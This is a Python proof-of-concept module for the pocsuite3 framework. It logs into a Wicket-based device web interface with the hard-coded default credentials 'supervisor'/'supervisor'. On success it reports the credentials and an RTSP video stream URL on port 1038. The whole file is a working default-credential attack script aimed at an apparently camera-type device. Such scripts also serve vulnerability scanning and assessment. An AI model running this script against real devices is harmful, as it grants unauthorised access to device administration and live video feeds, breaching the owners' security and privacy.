import re

from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests, logger,
    OptString, OrderedDict,
    random_str,
)
import requests
import os.path
from urllib.parse import urljoin, urlparse

class POC(POCBase):

    def _verify(self):
        creds = {
            'username': 'supervisor',
            'password': 'supervisor',

        }
        data = {
            'loginForm11_hf_0': '',
            'userName': creds['username'],
            'password': creds['password'],
            'login': ''
        }

        get_url = requests.get(self.url, allow_redirects=False)
        if get_url.status_code == 302:
            o_url = get_url.headers['Location']
            header = {
                'Referer': o_url
            }
            url = o_url + '&wicket:interface=:11:loginPanel:loginForm::IFormSubmitListener::'
            res = requests.post(url, data=data, headers=header)
            if res.status_code == 200 and 'Invalid user name or password, try again' not in res.text:
                # rtsp = requests.get(self.url)
                # if rtsp.status_code == 200:
                rtsp_ip = re.search(r'([\w-]+\.)+\w{1,3}', self.url)
                rtsp_url = rtsp_ip.group(0) + ':1038/lowQ.sdp'
                logger.info(f'RTSP://{rtsp_url}')
                result = {'VerifyInfo': {'Info':creds}}
                return self.parse_output(result)

register_poc(POC)
